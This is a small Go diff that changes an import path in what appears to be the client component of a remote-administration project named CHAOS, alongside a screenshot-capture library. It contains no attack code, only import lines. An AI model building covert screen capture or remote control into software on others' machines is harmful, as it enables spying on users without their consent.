@@ -4,7 +4,7 @@ import (
 	"bufio"
 	"bytes"
 	"github.com/kbinani/screenshot"
-	"github.com/youtrolledhahaha/youdmmmbaa/client/app/services"
+	"github.com/tiagorlampert/CHAOS/client/app/services"
 	"image/png"
 )
 
